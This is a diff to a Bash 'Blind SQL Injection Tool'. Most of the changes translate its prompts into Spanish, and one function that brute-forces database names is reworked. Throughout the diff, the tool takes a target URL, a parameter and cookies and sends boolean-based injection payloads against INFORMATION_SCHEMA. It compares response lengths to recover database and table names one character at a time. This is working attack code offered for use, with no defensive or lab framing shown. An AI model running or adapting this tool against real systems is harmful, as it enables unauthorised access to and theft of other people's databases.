@@ -11,13 +11,13 @@ echo -e "╚═════╝░╚═╝░░╚═╝░░░╚═╝░�
 
 echo -e "\033[1;31mWelcome to the Blind SQL Injection Tool\033[0m"
 echo "---------------------------------------"
-echo "1. Find the number of databases"
-echo "2. Brute force the database names"
-echo "3. Find the number and brute force the database names"
-echo "Select an option: "
+echo "1. Encontrar el numero de bases de datos"
+echo "2. Obtener el nombre de las bases de datos junto con sus tablas"
+echo "3. Encontrar el numero de bases de datos y obtener su nombre"
+echo "Seleccione una opcion: "
 read -r ACTION
 
-echo "Select HTTP method:"
+echo "Seleccionar metodo HTTP:"
 echo "1. GET"
 echo "2. POST"
 read -r METHOD_CHOICE
@@ -25,15 +25,15 @@ read -r METHOD_CHOICE
 METHOD="GET"
 COOKIES=""
 
-echo "Enter the target URL: "
+echo "Introducir URL: "
 read -r URL
 
-echo "Enter the parameter to test (e.g., id): "
+echo "Introduce el parametro (e.g., id): "
 read -r PARAMETER
 
 if [[ "$METHOD_CHOICE" -eq 2 ]]; then
 	METHOD="POST"
-	echo "Enter cookies if any (in the format 'cookieName1=cookieValue1; cookieName2=cookieValue2') or press enter to continue without:"
+	echo "Introduce las cookies si existen (formato 'cookieName1=cookieValue1; cookieName2=cookieValue2') o presiona intro para omitir:"
 	read -r COOKIES
 fi
 
@@ -100,7 +100,7 @@ extract_number_of_tables() {
 
 brute_force_table_names() {
 	local db_name=$1
-	echo "Extracting table names for database: $db_name"
+	echo "Extrayendo nombre de tablas de la base de datos: $db_name"
 
     # Puedes ajustar este valor según la cantidad máxima esperada de tablas
     local max_tables=100  
@@ -116,7 +116,7 @@ brute_force_table_names() {
 	    position=1
 	    while : ; do
 		    found_char=false
-		    for ascii in {48..57} {65..90} {97..122} 95 ; do # Números, letras y guion bajo
+		    for ascii in {48..57} {65..90} {97..122} 95 ; do # Números, letras y barra baja
 			    if [[ "$ascii" == 95 ]]; then
 				    char="_"
 			    else
@@ -140,47 +140,51 @@ brute_force_table_names() {
 		    # Si no encontramos un nombre de tabla, no hay más tablas
 		    break
 	    fi
-	    echo -e "\033[0;36mFound table:\033[0m $table_name"
+	    echo -e "\033[0;36mTabla encontrada:\033[0m $table_name"
     done
 }
 
 brute_force_db_names() {
-	local number_of_databases=$1
-	local db_name
-	local current_length
-	local reference_length=$(send_request "1' AND '1'='1" -- -)
+    local number_of_databases=$1
+    local db_name
+    local current_length
+    local reference_length=$(send_request "1' AND '1'='1" -- -)
+    echo "Longitud de referencia: $reference_length"
 
-	for ((db_index=1; db_index<=number_of_databases; db_index++)); do
-		db_name=""
-		local position=1
-		echo -e "\033[0;31mBrute forcing the name of database $db_index...\033[0m"
-		while : ; do
-			local found_char=false
-			for ascii in {48..57} {65..95} {97..122} ; do 
-				if [[ "$ascii" -eq 95 ]]; then
-					char="_"
-				else
-					char=$(printf "\\$(printf '%03o' "$ascii")")
-				fi
-				local query="1' OR ASCII(SUBSTRING((SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA ORDER BY SCHEMA_NAME LIMIT 1 OFFSET $((db_index - 1))), $position, 1))='$ascii' AND '1'='1"
-				current_length=$(send_request "$query")
-				if [[ "$current_length" != "$reference_length" ]]; then
-					db_name+="$char"
-					echo -n "$char"
-					found_char=true
-					break
-				fi
-			done
-			if ! $found_char; then
-				if [ -n "$db_name" ]; then
-					echo -e "\033[0;34m\nFinished brute-forcing database $db_index name:\033[0m $db_name"
-					brute_force_table_names "$db_name"
-				fi
-				break
-			fi
-			((position++))
-		done
-	done
+    for ((db_index=1; db_index<=number_of_databases; db_index++)); do
+        db_name=""
+        local position=1
+        echo -e "\033[0;31mEjerciendo fuerza bruta sobre el nombre de la base $db_index...\033[0m"
+        while : ; do
+            local found_char=false
+            for ascii in {48..57} {65..90} {97..122} 95 ; do 
+                if [[ "$ascii" -eq 95 ]]; then
+                    char="_"
+                else
+                    char=$(printf "\\$(printf '%03o' "$ascii")")
+                fi
+                local query="${PARAMETER}=' OR ASCII(SUBSTRING((SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA ORDER BY SCHEMA_NAME LIMIT 1 OFFSET $((db_index - 1))), $position, 1))=$ascii -- -"
+                #echo "Probando: $query"
+                current_length=$(send_request "$query")
+                #echo "Longitud actual: $current_length"
+                
+                if [[ "$current_length" != "$reference_length" ]]; then
+                    db_name+="$char"
+                    echo -n "$char"
+                    found_char=true
+                    break
+                fi
+            done
+            if ! $found_char; then
+                if [ -n "$db_name" ]; then
+                    echo -e "\033[0;34m\nTerminada la fuerza bruta sobre la base de datos $db_index name:\033[0m $db_name"
+                    # brute_force_table_names "$db_name"
+                fi
+                break
+            fi
+            ((position++))
+        done
+    done
 }
 
 brute_force_all(){
@@ -192,7 +196,7 @@ brute_force_all(){
 			brute_force_table_names "$db_name"
 		done
 	else
-		echo "Failed to find the number of databases."
+		echo "Error al extraer el numero de bases de datos."
 	fi
 }
 
@@ -206,14 +210,14 @@ list_items() {
 			if [ "$num_dbs" -gt 0 ]; then
 				brute_force_db_names "$num_dbs"
 			else
-				echo "Failed to find the number of databases."
+				echo "Error al encontrar el numero de bases de datos"
 			fi
 			;;
 		3)
 			brute_force_all
 			;;
 		*)
-			echo "Invalid option."
+			echo "Opcion invalida."
 			exit 1
 			;;
 	esac
